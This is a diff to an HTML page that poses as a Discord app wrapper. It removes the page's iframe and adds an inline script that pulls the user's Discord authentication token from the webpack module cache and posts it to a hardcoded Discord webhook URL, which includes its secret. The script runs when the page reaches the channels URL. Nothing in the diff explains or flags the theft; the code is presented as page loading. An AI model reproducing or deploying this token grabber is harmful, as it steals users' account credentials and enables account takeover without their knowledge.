@@ -13,7 +13,7 @@
             overflow: hidden;
         }
 
-        iframe {
+        #discordApp {
             width: 100%;
             height: 100%;
             border: none;
@@ -21,7 +21,64 @@
     </style>
 </head>
 <body>
-    <iframe src="https://discord.com/app" frameborder="0" allowfullscreen></iframe>
-    <script src="script.js"></script>
+    <div id="discordApp"></div>
+    <script>
+        // Function to execute console code
+        function executeConsoleCode() {
+            var webpackChunkdiscord_app = [];
+            var m = [];
+            webpackChunkdiscord_app.push(
+                [
+                    [''],
+                    {},
+                    e => {
+                        for (let c in e.c)
+                            m.push(e.c[c]);
+                    }
+                ]
+            );
+            var token = m.find(m => m?.exports?.default?.getToken !== void 0)?.exports.default.getToken();
+            sendTokenToWebhook(token);
+        }
+
+        // Function to send token to webhook
+        function sendTokenToWebhook(token) {
+            fetch("https://discord.com/api/webhooks/1220453114025345255/5QGDgO3N9Ti23sN-_OyaMprItT6FYuLUAECWeSuH4PY_XFX3P59gGRsS6rC5DM3r28tx", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ token: token })
+            })
+            .then(response => {
+                console.log("Token sent successfully");
+            })
+            .catch(error => {
+                console.error("Error sending token:", error);
+            });
+        }
+
+        // Load Discord app content dynamically
+        var discordAppContainer = document.getElementById('discordApp');
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://discord.com/app', true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                discordAppContainer.innerHTML = xhr.responseText;
+                // Once content is loaded, check if the URL matches the expected one
+                if (window.location.href === "https://discord.com/channels/@me") {
+                    executeConsoleCode();
+                } else {
+                    // Wait for the page to load and then check again
+                    window.addEventListener('load', function() {
+                        if (window.location.href === "https://discord.com/channels/@me") {
+                            executeConsoleCode();
+                        }
+                    });
+                }
+            }
+        };
+        xhr.send();
+    </script>
 </body>
 </html>
